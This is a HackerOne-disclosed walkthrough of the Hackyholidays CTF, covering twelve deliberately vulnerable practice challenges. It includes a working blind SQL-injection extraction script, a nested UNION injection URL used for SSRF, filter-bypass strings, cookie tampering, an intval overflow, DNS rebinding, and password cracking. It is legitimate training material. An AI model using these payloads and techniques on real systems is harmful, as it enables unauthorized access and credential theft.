# Hackyholidays CTF writeup

## Report Details
- **Report ID**: 1065583
- **URL**: https://hackerone.com/reports/1065583
- **State**: Closed
- **Severity**: none
- **Submitted**: 2020-12-24T01:38:29.201Z
- **Disclosed**: 2021-01-12T17:52:53.266Z

## Reporter
- **Username**: xehle
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# Writeup for the hackyholidays CTF

This CTF consisted of 12 challenges released daily in the 12 days leading up to christmas. The goal was to stop the Grinch from ruining christmas by slowly destroying the apps that he used to terrorize Santa and his elfs.

The challenges were:
1.  Robots.txt
2.  DOM Flag
3.  People Rater
4.  Swag Shop
5.  Secure Login
6.  My Diary
7.  Hate Mail Generator
8.  Forum
9.  Evil Quiz
10. Signup Manager
11. Recon Server
12. Attack Box

------------------------------------
# Robots.txt:
------------------------------------

The first thing anyone should do in a web based CTF is check the robots.txt file, a lot of times it contains hints
for further exploitation and to remove a lot of the guess work and/or bruteforcing. In this case this was actually 
our first flag and the hint for the next challenge. "/s3cr3t-ar3a"

{F1127861}

------------------------------------
# DOM Flag:
------------------------------------

Navigating to the "/s3cr3t-ar3a"endpoint we received from the robots.txt we see:

{F1127852}

Not much to see on this page, checking the site source with view source we also dont spot anything. But this just show is the static page as we received in the original HTTP request. There might have been changes made by javascript or other forms of script which we
can see with the developer consoler of your favorite browser. So just hitting inspect element on the red box we are greeted with our second flag.

{F1127843}

------------------------------------
# People Rater:
------------------------------------

In the meantime the site got updated with an "apps" directory where we will find the next 8 challenges. So let's take a look.

{F1127857}

Clicking start challenge we see a list of names we can click.

{F1127870}

Clicking on the names we just get an alert with various negative adjectives describing the person :(
Checking the source code to see how these alerts are generated we see:

```js
$('.thelist').on("click", "a", function(){
    $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
        alert( resp.rating );
    }).fail(function(){
        alert('Request failed');
    });
});
```
On clicking one of the names it gets the name elements "data-id" attribute and appends it to the "/people-rater/entry?id="
endpoint, getting back a json response and then either alerting the bad word or alerting a fail.
Grabbing the "data-id" for the first person we see its a base64 encoded value "eyJpZCI6Mn0=".
This decodes to "{"id":2}". Navigating to the endpoint with this id we get the following json response:
```js
{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```
Checking the next few names we have the id "{"id":3}", "{"id":4}" etc.
You might have noticed already that we grabbed the first name in the list, but the persons id is "2".
So, where is the person with id "1"?
Generating a base64 encoded version of "{"id":1}" and sending it to the endpoint we receive our flag.
```js
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```
Ofc he gives himself a nice description :)

------------------------------------
# Swag Shop
------------------------------------

Onto the next challenge:

{F1127867}

It looks like our goal this time is to get the personal details from the Grinch.
Opening the app we see a sad looking merch store, with the product images missing.

{F1127869}

Clicking on a purchase button it wants us to log in, but we do not have any credentials.
Trying a simple admin/admin to observe the request we see a call being made to "/swag-shop/api/login".
Throwing a few special characters at the username and password field to test for an SQLi we get nothing back.
So what we can do if we dont see any other ways to exploit what we are given is content discovery
to find more stuff to hack. We already know there is an "/api" enpoint so we should start our discovery here.
We quickly find two endpoints called "/sessions" and "/user".
The "/sessions" endpoint containted a json array of a bunch of base64 encoded json objects like the following:
```js
eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=
```
Which decodes to:
```js
{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}
```
A user and a cookie value. Just testing to see if we can get lucky taking over an active session i copied the cookie value to
my cookies like "session=cookie" and refreshed the main page, but nothing happened.
Looking at the "/sessions" endpoint again i noticed that one of the values was significantly longer than all the other ones which
had the same length.
```js
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ
```
Which decoded to:
```js
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```
This time we go a user value thats not null, we got something called a [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier)
We found another endpoint during content discovery which was "/user", sending a request to that
we get an error.
```js
{"error":"Missing required fields"}
```
Now we could try and bruteforce valid parameters that are missing from this request, or we could make an educated guess based on the
information we already have. We have a "user" value which is a uuid, so we can try "/user?user=test" and "/user?uuid=test".
Sending the first example we get the same error, but upon sending the second one we get a different error.
```js
{"error":"Could not find matching uuid"}
```
So we plug in the uuid we extracted from the session value, and?
```js
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```
We get the personal information of the Grinch, including our next flag.

------------------------------------
# Secure Login:
------------------------------------

{F1127863}

We are supposed to bypass the login page which looks like this:

{F1127865}

to get to the secret area. So let's try doing just that.
Since we don't have credentials again, obviously, we can try the good old admin/admin again and observe the request.
It just sends a POST request to the main page "/secure-login" with the parameters "username=admin&password=admin".
And since these credentials don't work we get an error, "Invalid Username".
Simple SQLi payloads also failed, so we are back to content discovery.
But content discovery fails this time, we dont get any new endpoints to play with.
Since the error we got earlier while trying to log in was "Invalid Username", maybe we are supposed to bruteforce a valid username.
Using a small list of common usernames and sending the request with burp intruder, we quickly find a response with a different error:
"Invalid Password".
Since we already had to bruteforce the username, we can also try bruteforcing the password.
And we also find a valid password "computer".
Logging in with the credentials username=access&password=computer we see the following:

{F1127864}

"No Files To Download" hmm. Looking at the cookie the login request set, we see a base64 encoded value which decoded to:
```js
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```
Why don't we just try and make ourselves admin by changing that false to true, re-base64 encoding it and setting it back as the cookie. Refreshing the page et voila, we have a file to download.
A zip archive that is password protected :(
Since we don't have a password and we already had to bruteforce the username and password to log in in the first place, i immediately started a bruteforce with the rockyou.txt wordlist using fcrackzip. A short wait later we had a valid password "hahahaha" and with this our flag and an ugly picture of the Grinch.

------------------------------------
# My Diary:
------------------------------------

Next challenge.

{F1127849}

We are supposed to hack a calendar, ok let's have a look.

{F1127850}

Nothing to click or see really on the page, the only thing that we can mess with is a url parameter called "template" which is set to "entries.html". Since the parameter is called "template" i tried some template injection strings but none worked, LFI attempts were fruitless as well. So time to throw a wordlist at it. The response for "index.php" stood out, php source code leaked.
```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```
Going through the logic, it removes some bad chars, replaces all matches of the string "admin.php" once and does it again for
"secretadmin.php". Then it checks if the file exists and loads it, or if the file doesn't exist we go back to the default "entries.html". The comment also tells us that the Grinch changed the secret "admin.php" file to "secretadmin.php", so our goal here is clear.
Craft a string that when passed through this logic ends up as "secretadmin.php". A bit of tinkering later i came up with
"secretsecretadmin.phpadminadmin.php.phpadminadmin.php.php" which when passed to the "template" param should give is the secretadmin.php file. And it does. Next flag received.

{F1127851}

------------------------------------
# Hate Mail Generator:
------------------------------------

{F1127856}

Sending hatemail, that's not nice. Time to break their operation.

{F1127858}

We see previous campaigns and a create new buttton. looking at the previous campaign we see a textbox with template strings which
seems like a hint on whats to come next and a preview button.

{F1127855}

Clicking the preview we see a header and footer with a message inbetween: "Hi Bob..... Guess what..... YOU SUCK!"
Time to generate our own hatemail.
Quickly entering junk to test and see the requests it sends we click "create" but we get an error "Sorry, but you've run out of credits". Thankfully there is a preview button, clicking it we get our own hatemail.
Looking at the request it sends we see the following parameters:
```js
preview_markup=Hello {{name}} ....asd&preview_data={"name":"Alice","email":"alice@test.com"}
```
A name template string and the data is is supposed to be replaced with. We saw in the Grinch mail that there is also a {{template:<urL>}} template string, trying to use that we get the footer/header like in the Grinch mail preview.
Loading a template file which probably does not exists throws an error:
```
Cannot find template file /templates/asd
```
Navigating to "/templates" we see an open directory which leaks a file called "38dhs_admins_only_header.html".
Opening that file give a 403, maybe we can include it with the template string.
This time we get a different error:
```
You do not have access to the file 38dhs_admins_only_header.html
```
Hmm since we can define our own template strings, maybe we can try to load the template inside of another template string.
So we replace the the name variable from the original request with our payload 
```js
{{template:38dhs_admins_only_header.html  }}
```
and we get the flag!

------------------------------------
# Forum:
------------------------------------

App number 8!

{F1127846}

{F1127853}

A forum. We can already see our most likely goal in this screenshot, become an admin to view the post.
Clicking around we a couple posts and a login button.
No valid credentials again so we skip the login for now. Since there arent really any inputs on the site 
we go back to content discovery which finds a phpmyadmin endpoint, but we dont have creds for this login either.
After many, many wasted packets and useless requests it came down to guessing that we could google for "grinch networks" or knowing that the creator for pretty much all the ctf challenges is [Adam](https://twitter.com/adamtlangley). Going to his github we see a commit he made to https://github.com/Grinch-Networks/forum, the source code of the forum!
Going through the code i couldnt spot any obvious bugs or erros i went through the commit history and found:
https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
```php
+ self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
- self::$read = new DbConnect( false, '', '','' );
```
Looking at the DbConnect class that instantiated we see that these are credentials.
Using them on the phpmyadmin endpoint grants us access.
Clicking around we find a users table that contains the username and password hash.

{F1127860}

Looking up the grinch hash on a site like https://crackstation.net we see that is has been cracked already.
```
BahHumbug
```
Logging in with grinch/BahHumbug on the main forum grants us access to the admin only post which contains our flag.

{F1127859}

------------------------------------
# Evil Quiz:
------------------------------------

{F1127842}

And evil quiz, lets see.

{F1127845}

We see 3 menu items and an admin button which is off to the side of the screenshot.
Admin login which we dont have creds for, so lets mess with the quiz.
We enter a name and get to the actual quiz. Just clicking random answers we get a score:
```
asd You scored 
    0/3
You're not evil at all!
There is 1 other player(s) with the same name as you!
```
Looking at the requests it sends we see a POST with our name, a POST with the quiz answers and a GET for the score.
Playing around a bit with the username input i noticed that the session cookie stays the same. Trying some SQL' payload in the name and going through the quiz again i noticed that the score had something interesting:
```
name=asd' or 1='1
```
```
There is 667760 other player(s) with the same name as you!
```
And when sending the equivalent false statement in SQLi
```
asd' or 1='0
```
There is 0 other player(s) with the same name as you!
```
This looks like a blind boolean based second order SQL injection, what a mouthful.
Luckily i found out that we can skip the actual quiz part and just send the name POST and the score GET because the session stays the same. Time for a dirty CTF script.

```js
import requests
import urllib
import sys
import re

baseurl = "https://hackyholidays.h1ctf.com/evil-quiz"
scoreurl = "https://hackyholidays.h1ctf.com/evil-quiz/score"

#proxies = {
#  'http': 'http://127.0.0.1:8080',
#  'https': 'http://127.0.0.1:8080',
#}





cookie = {"session":"b41fc04adcd4488d7207695cbe60b55e"}



list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#list="\\.,/@';#~][{})(-_=+\"!$£%^&*"
#list = "EFGHIJKLMNOPQRSTUVWXYZ0123456789"


for i in list:

    #a = "asd' or (select strcmp((select substr(table_name,1,1) from information_schema.tables where table_schema not like 'information_schema' limit 1 offset 1),'{}')=0)#".format(i)
    #a = "asd' or (select strcmp((SELECT substr(column_name,1,1) FROM information_schema.columns WHERE table_name = 'admin' limit 1 offset 0), '{}')=0)".format(i)
    a = "asd' or (select strcmp((SELECT substr(column_name,1,1) FROM information_schema.columns WHERE table_name = 'admin' limit 1 offset 1), '{}')=0)#".format(i)

    #a = "asd' or (select strcmp((select 1 from admin where substr(password,1,1)),'{}'))#".format(i)
    #a = "aaa' or (select+1+from+admin+where+MD5(SUBSTRING(password,1,1))=MD5(CHAR('{}')))#".format(i)
    data_name = {"name":"{}".format(a)}
    print(i)
    r = requests.post(baseurl, data=data_name, cookies=cookie)
    print(r.status_code)
    r = requests.get(scoreurl, cookies=cookie)
    #print(r.text)
    m = re.search("There is.*<", r.text)
    print(m.group(0))
```
There are various bits and bobs from the exploit process to grab what we need, enumerating tables and columns, grabbing the username and passowrd value one char at a time.
Logging in with the obtained credentials:
```
username: admin
password: S3creT_p4ssw0rd-$
```
{F1127844}

------------------------------------
# Signup Manager:
------------------------------------

Moving on to the last of the listed apps.

{F1127866}

Looks like we need to bypass another login. But this time we have a signup!
Before we do that looking at the source i spotted this at the top of the page:
```html
<!-- See README.md for assistance -->
```
Navigating to that we see:
```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

We get 2 big hints, the zip file we can download and point 6 on the list. The default login doesn't work, ofc it doesn't :(
The zip file contains the full source code, which is great for us. Whitebox testing.
Reading through the main file:
```php
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
```
This builds a users array from the mentioned users.txt, we can gather that the user is just saves as a single line of text in the file
with length limitations applied, we also see the last character in the line is our admin flag that we need to change.
```php
if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
    $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
    if (strlen($username) < 3) {
        $errors[] = 'Username must by at least 3 characters';
    } else {
        if (isset($all_users[$username])) {
            $errors[] = 'Username already exists';
        }
    }
    $password = md5($_POST["password"]);
    $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
    if (strlen($firstname) < 3) {
        $errors[] = 'First name must by at least 3 characters';
    }
    $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
    if (strlen($lastname) < 3) {
        $errors[] = 'Last name must by at least 3 characters';
    }
    if (!is_numeric($_POST["age"])) {
        $errors[] = 'Age entered is invalid';
    }
    if (strlen($_POST["age"]) > 3) {
        $errors[] = 'Age entered is too long';
    }
    $age = intval($_POST["age"]);
    if (count($errors) === 0) {
        $cookie = addUser($username, $password, $age, $firstname, $lastname);
        setcookie('token', $cookie, time() + 3600);
        header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
        exit();
    }
}
```
This is the main signup function, we can see some checks and sanitization. Most fields except length get capped at a certain length with substr(), except age which is just a check to see if the input is below 3 character, and at the bottom we call IntVal() on our age input, which becomes important in a bit. We then call addUser() which is defined as follows:
```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```
This builds the string that is eventually put into the users.txt. We can see that it pads the fields with "#" to a specific length if our input is too short and then cuts the string at a certain length 113. So if we can somehow overflow the lastname field into the admin flag field, we can make ourselves admin. But the fields are all length capped. This is where IntVal() comes into play, it converts different number formats to an integer. The interesting behaviour that we exploit, which also is NOT mentioned in the documentation for the IntVal() function is that it also accepts scientific number notation which looks like this "1e8", which is 3 characters long in this form but expanded to the actual number "100000000" is way longer. And this is what IntVal() does to our age input if we submit "1e8" as our age. Which overflows the age field and pushes everything to the right overflowing our last name into the admin flag field making us admin.
So sending that signup request with the right values and using them to sign into the application we get our flag.

{F1127868}

------------------------------------
# Recon Server:
------------------------------------

Second to last challenge (and definitely the hardest), this time we received the link to the app on the page for our last flag.

{F1127872}

We can see an API being mentioned we keep that in mind for later. For now lets look at the recon albums.
There are various pictures in the albums of Santa's  supposed location etc.
We can see that the albums are loaded via a hash in the url "/album?hash=jdh34k".
Clicking  on the pictures we see that they are loaded in a weird way too
"/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9"
Base64 decoded:
```
{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
```
Remembering the API being mentiond we can navigate to "/api" which gives us a few hints on what to look out for later down the road.

{F1127871}

Trying to navigate to anything under the "/api" directory we always get the same error:
"This endpoint cannot be visited from this IP address"
So this give us a hint that we are most likely looking for an SSRF or path traversal to send the request from inside the network.
Playing with the "/picture" parameter "data" i noticed while playing around that the "image" path is signed with the auth hash which looks like md5. Which means that we can only request images/urls that are signed by the server and have the correct auth. This could trivially be bypassed by changing the "auth" parameter from a string to "auth":true. Which would've spared us the nightmare that is to come. But this was an unintended route and was quickly fixed. So we had to find another way to sign urls. After a hint from Adam in the discord that the only way to generate the auth hash is by making the server do it, we could focus on other things but bruteforcing parameters or the md5 hash... there goes 4-5 hours.
There was the album endpoint with the hash paremter that didnt really give me intersting results except 404s, i already tried too many things with it before moving on to the picture parameter because of it which turned out to be a mistake.
I guess one valuable lesson learned here was dont just try SQLi with "1 or 1='1" but also "'1 and 1='1" or other sql statement because you might miss a critical vuln, or just use sqlmap...
This lets us dump the db:
```
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash | name |
+----+--------+-----------+
| 1 | 3dir42 | Xmas 2018 |
| 2 | 59grop | Xmas 2019 |
| 3 | jdh34k | Xmas 2020 |
+----+--------+-----------+
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo |
+----+----------+--------------------------------------+
| 1 | 1 | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2 | 1 | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3 | 2 | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4 | 3 | db507bdb186d33a719eb045603020cec.jpg |
| 5 | 3 | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6 | 3 | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```
But this didn't really get us what we need or wanted which is a way to generate auth hashes.
Many, many, many hours and a hint later (picture from the movie inception) i realized it was an sql injection
inside an sql injection. SQLi-nception.
And after many, many more hours playing around with it i found out that this is a way to generate these auth hashes for the picture url. Combining this with the "/api" endpoint we want to hit we can now generate signed requests like so:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27%20UNION%20SELECT%20%22%27%20union%20select%201,2,%27../api/user%27%23%22,null,null%23

Which generates a signed url for "/api/user" (which was found after playing generating request and bruteforcing endpoints)
which now look like the following:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==
This responds with:
"Invalid content type detected"
Hmm, guessing that there might be missing parameters i started bruteforcing for those and noticed that "/api/user?username=1" and
"/api/user?password=1" gave different responses:
"Expected HTTP status 200, Received: 204"

And as we learned earlier from the /api info page 204 means "Successful request but with no data found".
So it seems that if the request "fails" we get this response and when it succeeds we get a 200 but cant read the data because of a Content-type mismatch. Being that this challenge is heavily SQL themed one could take a guess that a "LIKE" lookup is being done.
Combining this with the "boolean" responses for successful/unsuccessful responses being 200/204 we can use wildcard operators like "%" and "_" we can slowly bruteforce the username and password one character at a time. Rewriting the sql python script from earlier to do what we need, i can now sit back and wait for it to spit out the correct username and password.
```
username: grinchadmin
password: s4nt4sucks
```
This allowed us to log in to the "attack-box" login which has been put onto the page in the meantime.

{F1127862}

------------------------------------
# Attack Box:
------------------------------------

The finale!

{F1127847}

The goal was to take down the Grinch network to prevent him from ruining christmas and this is our chance.
Seeing the only interactable things being three buttons, lets click one of them.

{F1127848}

Looks like the Grinch got [Hella booters](https://www.youtube.com/watch?v=3D3LrYFWrL0) connected to his botnet.
The button that we clicked launched the following URL:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
Base64 decoding the payload:
```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```
We see the IP being hit with the DOS and a hash. After a short PTSD flashback to the last challenge, and no other entrypoints, i started playing with the values. It was another authed request using the hash, i noticed that all characters were blocked except "a-zA-Z.-" which are the characters allowed in IPs and urls. Seeing no other attacks i started to try and crack the hash with hashcat on a google colab instance [colabcat](https://github.com/someshkar/colabcat) i decided the most reasonable thing was a salted md5 hash
in the following format md5($salt.$pass). So using the tried and tested CTF wordlist rockyou.txt and the "pass" in this case being the IP i got a crack in seconds. The salt was: "mrgrinch463"
This was very surprising given what we had to go through in the last challenge to achieve our goal.
Being able to hit arbitrary ips/urls now i tried localhost or 127.0.0.1.
Which error the ddos script stating that 127.0.0.1 is disallowed.
After some messing around i noticed that it allowed urls too which made a host lookup to get the IP and then start the pathetic "ping flood" :)
Knowing who is behind this CTF apart from Adam, Nahamsec, and being familiar with this past work it clicked.
He is known for 2 things, SSRF and DNS rebinding. Which we have a prime setup for here a TOCTOU discrepancy between the host lookup and the localhost check and the actual ping command.
So using tavisO's tool rbndr to generate a domain that switches its A records from 127.0.0.1 to 1.2.3.4, generating an authed URL and sending it, we get nothing...
Guess i was unlucky with the timing.
After a few more tries it worked, the Grinch DOS'd himself and revealed the final flag to me.

{F1127854}



Thanks for setting up another fun CTF in the days leading up to xmas. Since we are all bored at home because of covid, it was a nice way to pass the time.
Cya when the next CTF is on.

## Impact

Giving me something to do during covid xmas!

Happy holidays! :)

## Attachments
- evil.png
- domflag.png
- evilflag.png
- evilmain.png
- forum.png
- attack.png
- attack1.png
- diary.png
- diarycal.png
- diaryflag.png
- dom.png
- forummain.png
- hackyholidays.png
- hatemailcampaign.png
- hatemail.png
- peoplerater.png
- hatemailmain.png
- forumflag.png
- forumhash.png
- robots.png
- reconflag.png
- securelogin.png
- secureloginfiles.png
- secureloginlogin.png
- signup.png
- swagshop.png
- signupflag.png
- swagshopapp.png
- peoplerater_names.png
- reconapi.png
- recon.png
